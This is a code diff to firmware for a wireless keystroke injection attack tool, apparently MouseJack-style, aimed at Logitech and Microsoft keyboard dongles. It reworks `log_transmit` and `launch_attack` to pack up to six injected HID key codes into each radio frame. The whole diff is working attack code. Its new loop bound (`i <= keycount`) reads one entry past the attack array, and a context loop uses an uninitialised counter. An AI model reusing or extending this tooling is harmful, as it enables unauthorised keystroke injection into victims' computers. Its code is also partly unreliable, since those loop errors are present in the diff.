@@ -316,7 +316,7 @@ void log_checksum() {
   payload[last] = cksum;
 }
 
-void log_transmit(uint8_t meta, uint8_t hid) {
+void log_transmit(uint8_t meta, uint8_t keys2send[], uint8_t keysLen) {
   // setup empty payload
   payload_size = 10;
   for (int n; n < payload_size; n++)
@@ -325,7 +325,9 @@ void log_transmit(uint8_t meta, uint8_t hid) {
   // prepare key down frame
   payload[1] = 0xC1;
   payload[2] = meta;
-  payload[3] = hid;
+
+  for (int q = 0; q < keysLen; q++)
+    payload[3+q] = keys2send[q];
   log_checksum();
 
   // send key down
@@ -335,6 +337,11 @@ void log_transmit(uint8_t meta, uint8_t hid) {
   // prepare key up (null) frame
   payload[2] = 0;
   payload[3] = 0;
+  payload[4] = 0;
+  payload[5] = 0;
+  payload[6] = 0;
+  payload[7] = 0;
+  payload[8] = 0;
   log_checksum();
 
   // send key up
@@ -357,6 +364,9 @@ void launch_attack() {
     uint8_t hid = 0;
     uint8_t wait = 0;
     int offset = 0;
+    
+    uint8_t keys2send[6];
+    uint8_t keysLen = 0;
 
     int keycount = sizeof(attack) / 3;
     sequence = 0;
@@ -369,24 +379,66 @@ void launch_attack() {
     }
 
     // now inject the hid codes
-    for (int i = 0; i < keycount; i++)
+    for (int i = 0; i <= keycount; i++)
     {
       offset = i * 3;
       meta = attack[offset];
       hid = attack[offset + 1];
       wait = attack[offset + 2];
 
-      if (hid) {
-        Serial.print("sending hid code: ");
-        Serial.println(hid);
-        if (payload_type == MICROSOFT)
-          ms_transmit(meta, hid);
-        if (payload_type == LOGITECH)
-          log_transmit(meta, hid);
+      if (payload_type == LOGITECH) {
+        if (meta) {
+          if (keysLen > 0) {
+            log_transmit(0, keys2send, keysLen);
+            keysLen = 0;
+          }
+          keys2send[0] = hid;
+          log_transmit(meta, keys2send, 1);
+          keysLen = 0;
+        } else if (hid) {
+          Serial.print("hid code: ");
+          Serial.println(hid);
+          bool dup = false;
+          for (int j = 0; j < keysLen; j++) {
+            if (keys2send[j] == hid)
+              dup = true;
+          }
+          if (dup) {
+            log_transmit(meta, keys2send, keysLen);
+            keys2send[0] = hid;
+            keysLen = 1;
+          } else if (keysLen == 5) {
+            keys2send[5] = hid;
+            keysLen = 6;
+            log_transmit(meta, keys2send, keysLen);
+            keysLen = 0;
+          } else {
+            keys2send[keysLen] = hid;
+            keysLen++;
+          }
+        } else if (wait) {
+          if (keysLen > 0) {
+            log_transmit(meta, keys2send, keysLen);
+            keysLen = 0;
+          }
+          Serial.println("waiting");
+          delay(wait << 4);
+        }
+        if (i == keycount && keysLen > 0) {
+            log_transmit(meta, keys2send, keysLen);
+        }
       }
-      if (wait) {
-        Serial.println("waiting");
-        delay(wait << 4);
+
+      if (payload_type == MICROSOFT) {
+        if (hid) {
+          Serial.print("sending hid code: ");
+          Serial.println(hid);
+          ms_transmit(meta, hid);
+        }
+        if (wait) {
+          Serial.println("waiting");
+          delay(wait << 4);
+        }
       }
     }
 
